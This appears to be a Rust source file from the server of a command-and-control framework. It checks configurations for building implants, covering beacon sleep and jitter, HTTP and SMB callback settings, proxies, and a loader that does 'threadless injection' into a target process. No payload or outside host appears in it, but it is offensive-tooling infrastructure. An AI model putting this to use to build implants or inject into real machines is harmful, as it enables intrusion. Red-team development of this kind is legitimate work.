use rand::Rng;

use crate::return_error;
use crate::server::INSTANCES;
use crate::server::session::USERAGENT;
use crate::server::types::{Hexane, InjectionOptions, NetworkOptions};
use crate::server::utils::wrap_message;
use crate::server::listener::setup_listener;

pub(crate) fn load_instance(args: Vec<String>) -> crate::server::error::Result<()> {
    if args.len() != 3 {
        return_error!(format!("invalid input: {} arguments", args.len()))
    }

    let mut instance = match crate::server::config::map_config(&args[2]) {
        Ok(instance)    => instance,
        Err(e)          =>  return Err(e),
    };

    setup_instance(&mut instance)?;
    setup_listener(&mut instance)?;

    let build_dir   = instance.compiler.build_directory.as_str();
    let name        = instance.builder.output_name.as_str();
    let ext         = instance.compiler.file_extension.as_str();

    wrap_message("info", format!("{}/{}.{} is ready", build_dir, name, ext));
    INSTANCES.lock().unwrap().push(instance);

    Ok(())
}

fn setup_instance(instance: &mut Hexane) -> crate::server::error::Result<()> {
    let mut rng = rand::thread_rng();

    if instance.main.debug {
        instance.compiler.compiler_flags = String::from("-std=c++23 -g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC -fno-builtin -Wl,--no-seh,--enable-stdcall-fixup,--gc-sections");
    } else {
        instance.compiler.compiler_flags = String::from("-std=c++23 -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC  -fno-builtin -Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections");
    }

    instance.peer_id = rng.random::<u32>();
    instance.group_id = 0;

    // todo: build process

    Ok(())
}

pub(crate) fn check_instance(instance: &mut Hexane) -> crate::server::error::Result<()> {
    // check config
    {
        if instance.main.hostname.is_empty()                        { return_error!("a valid hostname must be provided") }
        if instance.main.architecture.is_empty()                    { return_error!("a valid architecture must be provided") }
        if instance.main.jitter < 0 || instance.main.jitter > 100   { return_error!("jitter cannot be less than 0% or greater than 100%") }
        if instance.main.sleeptime < 0                              { return_error!("sleeptime cannot be less than zero. wtf are you doing?") }
    }

    // check builder
    {
        if instance.builder.output_name.is_empty()      { return_error!("a name for the build must be provided") }
        if instance.builder.root_directory.is_empty()   { return_error!("a root directory for implant files must be provided") }

        if let Some(linker_script) = &instance.builder.linker_script {
            if linker_script.is_empty() { return_error!("linker_script field found but linker script path must be provided") }
        }

        if let Some(modules) = &instance.builder.loaded_modules {
            if modules.is_empty() { return_error!("loaded_modules field found but module names must be provided") }
        }

        if let Some(deps) = &instance.builder.dependencies {
            if deps.is_empty() { return_error!("builder dependencies field found but dependencies must be provided") }
        }

        if let Some(inc) = &instance.builder.include_directories {
            if inc.is_empty() { return_error!("builder include_directories field found but include directories must be provided") }
        }
    }

    // check network
    match &mut instance.network.options {
        NetworkOptions::Http(http) => {

            if http.address.is_empty()              { return_error!("a valid return url must be provided") }
            if http.port < 0 || http.port > 65535   { return_error!("http port must be between 0-65535") }
            if http.endpoints.is_empty()            { return_error!("at least one valid endpoint must be provided") }
            if http.useragent.is_none()             { http.useragent = Some(USERAGENT.to_string()); }

            if let Some(headers) = &http.headers {
                if headers.is_empty() { return_error!("http header field found but names must be provided") }
            }

            if let Some(domain) = &http.domain {
                if domain.is_empty() { return_error!("domain name field found but domain name must be provided") }
            }

            if let Some(proxy) = &http.proxy {
                if proxy.address.is_empty()             { return_error!("proxy field detected but proxy address must be provided") }
                if proxy.port < 0 || proxy.port > 65535 { return_error!("proxy field detected but proxy port must be between 0-65535") }

                if let Some(username) = &proxy.username {
                    if username.is_empty() { return_error!("proxy username field detected but the username was not provided") }
                }

                if let Some(password) = &proxy.password {
                    if password.is_empty() { return_error!("proxy password field detected but the password was not provided") }
                }

                if let Some(proto) = &proxy.proto {
                    if proto.is_empty() { return_error!("proxy protocol must be provided") }
                } else {
                    return_error!("proxy protocol must be provided")
                }
            }
        },

        NetworkOptions::Smb(smb) => {
            if smb.egress_peer.is_empty() { return_error!("an implant type of smb must provide the name of it's parent node") }
        }
    }

    // check loader
    if let Some(loader) = &mut instance.loader {
        if loader.root_directory.is_empty() { return_error!("loader field detected but root directory must be provided")}
        if loader.sources.is_empty()        { return_error!("loader field detected but sources must be provided")}
        if loader.rsrc_script.is_empty()    { return_error!("loader field detected but rsrc script must be provided")}

        if let Some(linker) = &loader.linker_script {
            if linker.is_empty() { return_error!("loader ld field detected but linker script must be provided")}
        }

        match &mut loader.injection {
            InjectionOptions::Threadless(threadless) => {
                if threadless.execute_object.is_empty()     { return_error!("loader field detected 'threadless injection' but an execute_object must be provided")}
                if threadless.loader_assembly.is_empty()    { return_error!("loader field detected 'threadless injection' but a loader assembly must be provided")}
                if threadless.target_process.is_empty()     { return_error!("loader field detected 'threadless injection' but a target process must be provided")}
                if threadless.target_module.is_empty()      { return_error!("laoder field detected 'threadless injection' but a target module must be provided")}
                if threadless.target_function.is_empty()    { return_error!("laoder field detected 'threadless injection' but a target function must be provided")}
            },
            InjectionOptions::Threadpool(_) => {
                return_error!("threadpool injection not yet supported")
            }
        }
    }

    Ok(())
}
